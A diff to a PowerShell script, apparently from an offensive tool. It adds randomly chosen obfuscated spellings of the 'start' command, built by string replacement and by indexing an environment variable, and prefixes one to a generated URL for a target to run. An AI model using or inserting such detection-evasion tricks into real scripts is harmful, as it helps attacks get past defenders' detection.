@@ -534,12 +534,20 @@ If($Exec.IsPresent)
       return   
    }
 
+   $SysCallList = @(
+      "&('s0xar0x' -replace '0x','t')",
+      "&(`$Env:DRIVERDATA[9,14,35,21,14]-join'')"
+   )
+
+   ## Random select one obfuscated 'start' command
+   $systemcall = $(Get-Random -InputObject $SysCallList)
+
    ## Create Data Table for output
    $mytable = New-Object System.Data.DataTable
    $mytable.Columns.Add("Execute http.server")|Out-Null
 
    ## Add values to table
-   $ToExecut = "&(`$Env:DRIVERDATA[9,14,35,21,14]-join'') $FinalUrl"
+   $ToExecut = "$systemcall $FinalUrl"
    $mytable.Rows.Add("$ToExecut")|Out-Null
 
    ## Display Data Table
